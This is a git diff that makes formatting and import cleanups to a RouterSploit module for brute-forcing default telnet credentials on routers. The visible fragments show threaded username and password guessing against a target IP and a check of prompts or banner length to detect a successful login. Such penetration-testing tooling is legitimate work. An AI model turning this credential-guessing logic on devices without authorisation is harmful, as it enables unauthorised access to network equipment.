@@ -1,7 +1,15 @@
 import threading
 import telnetlib
 
-from routersploit import *
+from routersploit import (
+    exploits,
+    wordlists,
+    print_status,
+    print_error,
+    LockedIterator,
+    print_success,
+    print_table,
+)
 
 
 class Exploit(exploits.Exploit):
@@ -12,8 +20,8 @@ class Exploit(exploits.Exploit):
     __info__ = {
         'name': 'Telnet Default Creds',
         'author': [
-            'Marcin Bury <marcin.bury[at]reverse-shell.com>' # routersploit module
-         ]
+            'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
+        ]
     }
 
     target = exploits.Option('', 'Target IP address')
@@ -40,7 +48,7 @@ class Exploit(exploits.Exploit):
             defaults = open(self.defaults[7:], 'r')
         else:
             defaults = [self.defaults]
-        
+
         collection = LockedIterator(defaults)
         self.run_threads(self.threads, self.target_function, collection)
 
@@ -73,13 +81,13 @@ class Exploit(exploits.Exploit):
                         tn.write(password + "\r\n")
                         tn.write("\r\n")
 
-                        (i,obj,res) = tn.expect(["Incorrect", "incorrect"], 5)
+                        (i, obj, res) = tn.expect(["Incorrect", "incorrect"], 5)
                         tn.close()
 
                         if i != -1:
                             print_error(name, "Username: '{}' Password: '{}'".format(user, password))
                         else:
-                            if any(map(lambda x: x in res, ["#", "$",">"])) or len(res) > 500: # big banner e.g. mikrotik
+                            if any(map(lambda x: x in res, ["#", "$", ">"])) or len(res) > 500:  # big banner e.g. mikrotik
                                 running.clear()
                                 print_success("{}: Authentication succeed!".format(name), user, password)
                                 self.credentials.append((user, password))
@@ -92,6 +100,6 @@ class Exploit(exploits.Exploit):
                         if retries > 2:
                             print_error("Too much connection problems. Quiting...")
                             return
-                        continue 
+                        continue
 
         print_status(name, 'process is terminated.')
